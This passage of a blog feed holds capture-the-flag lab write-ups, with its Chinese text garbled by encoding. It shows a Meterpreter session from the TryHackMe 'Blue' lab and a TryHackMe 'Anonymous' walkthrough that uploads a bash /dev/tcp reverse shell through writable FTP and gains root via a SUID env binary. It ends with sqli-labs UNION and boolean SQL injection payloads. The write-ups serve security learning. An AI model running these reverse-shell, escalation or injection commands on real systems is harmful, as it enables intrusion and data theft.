10.10.246.255:445 - Triggering free of corrupted buffer.</span><br><span class="line">[*] Sending stage (200262 bytes) to 10.10.246.255</span><br><span class="line">[*] Meterpreter session 1 opened (10.9.248.83:4444 -&gt; 10.10.246.255:49201) at 2021-01-15 05:54:08 -0500</span><br><span class="line">[+] 10.10.246.255:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 10.10.246.255:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 10.10.246.255:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x01-Demo&quot;&gt;&lt;a href=&quot;#0x01-Demo&quot; class=&quot;headerlink&quot; title=&quot;0x01.Demo&quot;&gt;&lt;/a&gt;0x01.Demo&lt;/h2&gt;&lt;img src=&quot;/2021/01/15/tryhackme-blue/image-20210115194912000.png&quot; class&gt;</summary>
    
    
    
    <category term="Tryhackme" scheme="https://lunamoore.github.io/categories/Tryhackme/"/>
    
    
    <category term="é¶æœº" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>tryhackme-[Anonymous]</title>
    <link href="https://lunamoore.github.io/2021/01/13/tryhackme-Anonymous/"/>
    <id>https://lunamoore.github.io/2021/01/13/tryhackme-Anonymous/</id>
    <published>2021-01-13T06:58:12.000Z</published>
    <updated>2021-01-13T07:01:13.189Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-Demo"><a href="#0x01-Demo" class="headerlink" title="0x01.Demo"></a>0x01.Demo</h2><img src="/2021/01/13/tryhackme-Anonymous/image-20210113134507401.png" class><a id="more"></a><h2 id="0x02-ä¿¡æ¯æ”¶é›†"><a href="#0x02-ä¿¡æ¯æ”¶é›†" class="headerlink" title="0x02.ä¿¡æ¯æ”¶é›†"></a>0x02.ä¿¡æ¯æ”¶é›†</h2><p><code>å¯ä»¥çœ‹åˆ°å¼€æ”¾äº†4ä¸ªç«¯å£21/22/139/445 å…¶ä¸­ftpå¼€æ”¾äº†åŒ¿åç™»å…¥ï¼Œä¸”ç›®å½•ä¸ºscripts</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tryhackme/anonymous# nmap -sC -sV -sT 10.10.7.51 -oN nmap.CVT</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-13 00:46 EST</span><br><span class="line">Nmap scan report for 10.10.7.51</span><br><span class="line">Host is up (0.36s latency).</span><br><span class="line">Not shown: 996 closed ports</span><br><span class="line">PORT    STATE SERVICE     VERSION</span><br><span class="line">21/tcp  open  ftp         vsftpd 2.0.8 or later</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:10.9.248.83</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 5</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)</span><br><span class="line">|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)</span><br><span class="line">|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)</span><br><span class="line">139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)</span><br><span class="line">Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 1s, deviation: 2s, median: 0s</span><br><span class="line">|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)</span><br><span class="line">|   Computer name: anonymous</span><br><span class="line">|   NetBIOS computer name: ANONYMOUS\x00</span><br><span class="line">|   Domain name: \x00</span><br><span class="line">|   FQDN: anonymous</span><br><span class="line">|_  System time: 2021-01-13T05:48:13+00:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2021-01-13T05:48:11</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 157.83 seconds</span><br><span class="line">root@JIYE:~/tryhackme/anonymous#</span><br></pre></td></tr></table></figure><p><code>æŸ¥çœ‹æœåŠ¡å…±äº«çš„èµ„æºï¼Œå‘ç°ä¸ºpics</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tryhackme/anonymous# smbclient -L 10.10.7.51</span><br><span class="line">Enter WORKGROUP\root&#x27;s password: </span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">        print$          Disk      Printer Drivers</span><br><span class="line">        pics            Disk      My SMB Share Directory for Pics</span><br><span class="line">        IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))</span><br><span class="line">SMB1 disabled -- no workgroup available</span><br><span class="line">root@JIYE:~/tryhackme/anonymous#</span><br></pre></td></tr></table></figure><h2 id="0x03-åŒ¿åç™»å…¥ftp"><a href="#0x03-åŒ¿åç™»å…¥ftp" class="headerlink" title="0x03.åŒ¿åç™»å…¥ftp"></a>0x03.åŒ¿åç™»å…¥ftp</h2><p><code>å‘ç°scriptsç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œå¹¶ä¸‹è½½</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tryhackme/anonymous# ftp 10.10.7.51</span><br><span class="line">Connected to 10.10.7.51.</span><br><span class="line">220 NamelessOne&#x27;s FTP Server!</span><br><span class="line">Name (10.10.7.51:root): anonymous</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password:</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system type is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> ls</span></span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts</span><br><span class="line">226 Directory send OK.</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> <span class="built_in">cd</span> scripts</span></span><br><span class="line">250 Directory successfully changed.</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> ls</span></span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh</span><br><span class="line">-rw-rw-r--    1 1000     1000          946 Jan 13 05:47 removed_files.log</span><br><span class="line">-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt</span><br><span class="line">226 Directory send OK.</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> get clean.sh</span></span><br><span class="line">local: clean.sh remote: clean.sh</span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Opening BINARY mode data connection for clean.sh (314 bytes).</span><br><span class="line">226 Transfer complete.</span><br><span class="line">314 bytes received in 0.00 secs (3.4820 MB/s)</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> get removed_files.log</span></span><br><span class="line">local: removed_files.log remote: removed_files.log</span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Opening BINARY mode data connection for removed_files.log (989 bytes).</span><br><span class="line">226 Transfer complete.</span><br><span class="line">989 bytes received in 0.57 secs (1.6842 kB/s)</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> get to_do.txt</span></span><br><span class="line">local: to_do.txt remote: to_do.txt</span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Opening BINARY mode data connection for to_do.txt (68 bytes).</span><br><span class="line">226 Transfer complete.</span><br><span class="line">68 bytes received in 0.60 secs (0.1115 kB/s)</span><br><span class="line"><span class="meta">ftp&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x04-æŸ¥çœ‹æ–‡ä»¶"><a href="#0x04-æŸ¥çœ‹æ–‡ä»¶" class="headerlink" title="0x04.æŸ¥çœ‹æ–‡ä»¶"></a>0x04.æŸ¥çœ‹æ–‡ä»¶</h2><p><code>å‘ç°clean.shä½œç”¨ä¸ºåˆ é™¤/tmpä¸‹çš„æ–‡ä»¶ï¼Œå¦å¤–ä¸¤ä¸ªæ–‡ä»¶æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¸œè¥¿</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tryhackme/anonymous# cat clean.sh </span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">tmp_files=0</span><br><span class="line">echo $tmp_files</span><br><span class="line">if [ $tmp_files=0 ]</span><br><span class="line">then</span><br><span class="line">        echo &quot;Running cleanup script:  nothing to delete&quot; &gt;&gt; /var/ftp/scripts/removed_files.log</span><br><span class="line">else</span><br><span class="line">    for LINE in $tmp_files; do</span><br><span class="line">        rm -rf /tmp/$LINE &amp;&amp; echo &quot;$(date) | Removed file /tmp/$LINE&quot; &gt;&gt; /var/ftp/scripts/removed_files.log;done</span><br><span class="line">fi</span><br><span class="line">root@JIYE:~/tryhackme/anonymous#</span><br></pre></td></tr></table></figure><h2 id="0x05-åå¼¹shell"><a href="#0x05-åå¼¹shell" class="headerlink" title="0x05.åå¼¹shell"></a>0x05.åå¼¹shell</h2><p><code>ä¿®æ”¹clean.shå¹¶ä¸Šä¼ ï¼Œæ–‡ä»¶å†…å®¹å¦‚ä¸‹</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tryhackme/anonymous# cat clean.sh </span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/10.9.248.83/6666 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><span class="exturl" data-url="aHR0cDovL3BlbnRlc3Rtb25rZXkubmV0Lw==">shellåˆ©ç”¨<i class="fa fa-external-link-alt"></i></span></p><p><code>å¯¹æœåŠ¡å™¨æ–‡ä»¶è¿›è¡Œè¦†ç›–</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> put clean.sh clean.sh </span></span><br><span class="line">local: clean.sh remote: clean.sh</span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Ok to send data.</span><br><span class="line">226 Transfer complete.</span><br><span class="line">54 bytes sent in 0.00 secs (1.0098 MB/s)</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> </span></span><br></pre></td></tr></table></figure><p><code>kaliç›‘å¬ç«¯å£ï¼Œä½¿ç”¨rlwrapå°±å¯ä»¥ä½¿ç”¨é”®ç›˜ä¸Šä¸‹ç®­å¤´äº†</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tryhackme/anonymous# rlwrap nc -nvlp 6666</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">connect to [10.9.248.83] from (UNKNOWN) [10.10.136.156] 49676</span><br><span class="line">bash: cannot set terminal process group (1144): Inappropriate ioctl for device</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">whoami</span><br><span class="line">whoami</span><br><span class="line">namelessone</span><br><span class="line">ls</span><br><span class="line">ls</span><br><span class="line">pics</span><br><span class="line">user.txt</span><br><span class="line">cat user.txt</span><br><span class="line">cat user.txt</span><br><span class="line">****************************</span><br></pre></td></tr></table></figure><h2 id="0x06-ææƒ"><a href="#0x06-ææƒ" class="headerlink" title="0x06.ææƒ"></a>0x06.ææƒ</h2><p><code>ä½¿ç”¨SUIDææƒ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 2&gt;/dev/nul</span><br><span class="line">æˆ–è€…</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">/usr/bin/env</span><br></pre></td></tr></table></figure><p><span class="exturl" data-url="aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8vZ3Rmb2JpbnMvZW52Lw==">envææƒå‚è€ƒ<i class="fa fa-external-link-alt"></i></span></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/env /bin/sh -p</span><br><span class="line">id</span><br><span class="line">uid=1000(namelessone) gid=1000(namelessone) euid=0(root) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)</span><br><span class="line">ls</span><br><span class="line">pics</span><br><span class="line">user.txt</span><br><span class="line">pwd</span><br><span class="line">/home/namelessone</span><br><span class="line">cd /root</span><br><span class="line">pwd</span><br><span class="line">/root</span><br><span class="line">ls</span><br><span class="line">root.txt</span><br><span class="line">cat root.txt</span><br><span class="line">*************************</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x01-Demo&quot;&gt;&lt;a href=&quot;#0x01-Demo&quot; class=&quot;headerlink&quot; title=&quot;0x01.Demo&quot;&gt;&lt;/a&gt;0x01.Demo&lt;/h2&gt;&lt;img src=&quot;/2021/01/13/tryhackme-Anonymous/image-20210113134507401.png&quot; class&gt;</summary>
    
    
    
    <category term="Tryhackme" scheme="https://lunamoore.github.io/categories/Tryhackme/"/>
    
    
    <category term="é¶æœº" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>Sqli_labs_Page1(basic)</title>
    <link href="https://lunamoore.github.io/2021/01/10/Sqli-labs-Page1-basic/"/>
    <id>https://lunamoore.github.io/2021/01/10/Sqli-labs-Page1-basic/</id>
    <published>2021-01-10T05:39:49.000Z</published>
    <updated>2021-01-16T08:13:59.848Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Sqli_labs_Page1(basic)</strong></p><a id="more"></a><h2 id="0x01-Less-1-GET-åŸºäºæŠ¥é”™-å•å¼•å·"><a href="#0x01-Less-1-GET-åŸºäºæŠ¥é”™-å•å¼•å·" class="headerlink" title="0x01.Less-1 GET åŸºäºæŠ¥é”™ å•å¼•å·"></a>0x01.Less-1 GET åŸºäºæŠ¥é”™ å•å¼•å·</h2><p><code>æ­£å¸¸è®¿é—®</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-1/?id=1</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201230221905854.png" class><p><code>æµ‹è¯•æŠ¥é”™</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-1/?id=1&#x27;</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201230222040571.png" class><p><code>æ¢æµ‹å­—æ®µæ•°</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-1/?id=1&#x27; order by 1 -- -</span><br><span class="line">http://192.168.1.100/sqli/Less-1/?id=1&#x27; order by 2 -- -</span><br><span class="line">http://192.168.1.100/sqli/Less-1/?id=1&#x27; order by 3 -- -</span><br><span class="line">http://192.168.1.100/sqli/Less-1/?id=1&#x27; order by 4 -- -</span><br></pre></td></tr></table></figure><p><code>åˆ°4å›æ˜¾ï¼Œç»“æœä¸º3åˆ—</code></p><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201230222525420.png" class><p><code>unionæ³¨å…¥ï¼Œidéœ€ä¸ºä¸€ä¸ªä¸å­˜åœ¨çš„æ•°ï¼Œè¿›è¡Œçˆ†åº“</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-1/?id=0&#x27; union select 1,database(),user() -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201230223306403.png" class><p><code>çˆ†è¡¨</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-1/?id=0&#x27; union select 1,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),3 -- -</span><br></pre></td></tr></table></figure><blockquote><p>select table_name from information_schema.tables where table_schema=â€™securityâ€™ limit 0,1;ä¸ºæŸ¥è¯¢securityæ•°æ®åº“çš„ç¬¬ä¸€å¼ è¡¨</p></blockquote><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201230225728017.png" class><p><code>ä¾æ¬¡ç±»æ¨ï¼ŒæŸ¥è¯¢ç¬¬äºŒã€ä¸‰ã€å››å¼ ~</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-1/?id=0&#x27; union select 1,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 1,1),3 -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-1/?id=0&#x27; union select 1,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 2,1),3 -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-1/?id=0&#x27; union select 1,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 3,1),3 -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201230225821260.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201230230132459.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201230230220235.png" class><p><code>å¯¹emailsè¡¨çˆ†å­—æ®µï¼Œä¸‹é¢ä¸ºç¬¬ä¸€ä¸ªå­—æ®µ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-1/?id=0&#x27; union select 1,(select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;emails&#x27; limit 0,1),3 -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201230232717251.png" class><p><code>ç¬¬äºŒä¸ªå­—æ®µä¸ç¬¬ä¸‰ä¸ªå­—æ®µå¦‚ä¸‹ï¼Œç¬¬ä¸‰ä¸ªå­—æ®µä¸ºç©º</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-1/?id=0&#x27; union select 1,(select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;emails&#x27; limit 1,1),3 -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-1/?id=0&#x27; union select 1,(select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;emails&#x27; limit 2,1),3 -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201230232456670.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201230232741394.png" class><p><code>çŸ¥é“äº†å­—æ®µåä¸è¡¨åå°±å¯ä»¥è¯»å–æ•°æ®äº†ï¼Œè¯»å–åˆ°äº†æœ¬ä¸è¯¥è®©ç”¨æˆ·è¯»å–åˆ°çš„å†…å®¹</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-1/?id=0&#x27; union select 1,(select email_id from emails limit 0,1),3 -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201230233414685.png" class><h2 id="0x02-Less-2-GET-åŸºäºæŠ¥é”™-åŸºäºæ•´å‹"><a href="#0x02-Less-2-GET-åŸºäºæŠ¥é”™-åŸºäºæ•´å‹" class="headerlink" title="0x02.Less-2 GET åŸºäºæŠ¥é”™ åŸºäºæ•´å‹"></a>0x02.Less-2 GET åŸºäºæŠ¥é”™ åŸºäºæ•´å‹</h2><p><code>åŒLess1ï¼Œåªéœ€å°†å•å¼•å·å»æ‰å³å¯</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-2/?id=0 union select 1,(select email_id from emails limit 0,1),3 -- -</span><br></pre></td></tr></table></figure><h2 id="0x03-Less-3-GET-åŸºäºæŠ¥é”™-å•å¼•å·-æ‹¬å·"><a href="#0x03-Less-3-GET-åŸºäºæŠ¥é”™-å•å¼•å·-æ‹¬å·" class="headerlink" title="0x03.Less-3 GET åŸºäºæŠ¥é”™ å•å¼•å·+æ‹¬å·"></a>0x03.Less-3 GET åŸºäºæŠ¥é”™ å•å¼•å·+æ‹¬å·</h2><p><code>åŒLess1ï¼ŒåŠ ä¸€ä¸ªæ‹¬å·ï¼Œè¿™æ˜¯ä¸€ä¸ªå˜å½¢é¢˜</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-3/?id=0&#x27;) union select 1,(select email_id from emails limit 0,1),3 -- -</span><br></pre></td></tr></table></figure><h2 id="0x04-Less-4-GET-åŸºäºæŠ¥é”™-åŒå¼•å·-æ‹¬å·"><a href="#0x04-Less-4-GET-åŸºäºæŠ¥é”™-åŒå¼•å·-æ‹¬å·" class="headerlink" title="0x04.Less-4 GET åŸºäºæŠ¥é”™ åŒå¼•å·+æ‹¬å·"></a>0x04.Less-4 GET åŸºäºæŠ¥é”™ åŒå¼•å·+æ‹¬å·</h2><p><code>åŒLess3ï¼Œåªéœ€å°†å•å¼•å·æ¢ä¸ºåŒå¼•å·å³å¯</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-4/?id=0&quot;) union select 1,(select email_id from emails limit 0,1),3 -- -</span><br></pre></td></tr></table></figure><h2 id="0x05-Less-5-GET-åŒæ³¨å…¥-å•å¼•å·"><a href="#0x05-Less-5-GET-åŒæ³¨å…¥-å•å¼•å·" class="headerlink" title="0x05.Less-5 GET åŒæ³¨å…¥ å•å¼•å·"></a>0x05.Less-5 GET åŒæ³¨å…¥ å•å¼•å·</h2><p><code>æµ‹è¯•å‘ç°æ­£å¸¸?id=1æœ‰å›æ˜¾ï¼ŒåŠ ä¸Šå•å¼•å·ä¼šå‡ºç°æŠ¥é”™</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1</span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27;</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231174115897.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231174144932.png" class><p><code>æ¥ç€æµ‹è¯•å‘ç°å½“æ¡ä»¶ä¸ºå‡æ—¶æ²¡æœ‰å›æ˜¾ï¼Œå­˜åœ¨boolæ³¨å…¥</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and 1=1 -- -</span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and 1=2 -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231174447919.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231174515636.png" 